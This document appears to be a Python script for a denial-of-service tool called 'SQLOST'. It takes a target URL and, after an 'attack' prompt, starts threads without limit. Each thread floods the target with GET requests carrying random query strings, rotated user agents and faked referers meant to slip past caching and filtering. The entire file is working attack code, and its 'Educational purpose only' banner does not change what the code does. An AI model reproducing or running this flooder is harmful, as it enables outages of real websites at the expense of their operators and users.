import os
import requests
import threading
import random
import sys
from sys import argv
import random
import string
import time
import ctypes

########################################
#       Educational purpose only       #
########################################
st = 0.0005
def sp(str): 
  for letter in str: # for loop to loop through each char
    sys.stdout.write(letter) 
    sys.stdout.flush()
    time.sleep(st) # waits a certain amount of time
  print()
  
red = '\033[31m'
yellow = '\033[93m'
lgreen = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'
cyan = '\033[96m'
  
if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")


url = input(red+"Target:  ").strip()


count = 0
headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
]


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers
def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str

sp(lgreen+"""
DDDDDDDDDDDDD                                             SSSSSSSSSSSSSSS 
D::::::::::::DDD                                        SS:::::::::::::::S
D:::::::::::::::DD                                     S:::::SSSSSS::::::S
DDD:::::DDDDD:::::D                                    S:::::S     SSSSSSS
  D:::::D    D:::::D    ooooooooooo       ssssssssss   S:::::S            
  D:::::D     D:::::D oo:::::::::::oo   ss::::::::::s  S:::::S            
  D:::::D     D:::::Do:::::::::::::::oss:::::::::::::s  S::::SSSS         
  D:::::D     D:::::Do:::::ooooo:::::os::::::ssss:::::s  SS::::::SSSSS    
  D:::::D     D:::::Do::::o     o::::o s:::::s  ssssss     SSS::::::::SS  
  D:::::D     D:::::Do::::o     o::::o   s::::::s             SSSSSS::::S 
  D:::::D     D:::::Do::::o     o::::o      s::::::s               S:::::S
  D:::::D    D:::::D o::::o     o::::ossssss   s:::::s             S:::::S
DDD:::::DDDDD:::::D  o:::::ooooo:::::os:::::ssss::::::sSSSSSSS     S:::::S
D:::::::::::::::DD   o:::::::::::::::os::::::::::::::s S::::::SSSSSS:::::S
D::::::::::::DDD      oo:::::::::::oo  s:::::::::::ss  S:::::::::::::::SS 
DDDDDDDDDDDDD           ooooooooooo     sssssssssss     SSSSSSSSSSSSSSS""")
sp(red+bold+"                   «-------{ SQLOST }-------»")
sp(cyan+"              /\/\/\/\/\-- Version V 0.1 --/\/\/\/\/\ ")
print(cyan+"                       github.com/SqLoSt")
input(yellow+bold+">> press any key to start attack. <<")
    
class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                count += 1
                print (red+"{0} - Package Sent".format(count))
            except requests.exceptions.ConnectionError:
                print ("server may be down.")
                pass
            except requests.exceptions.InvalidSchema:
                print (red+"[URL Error 404 : Url is wrong.]")
                raise SystemExit()
            except ValueError:
                print (yellow+"[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User.. exiting...]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User exiting...]")
        raise SystemExit()
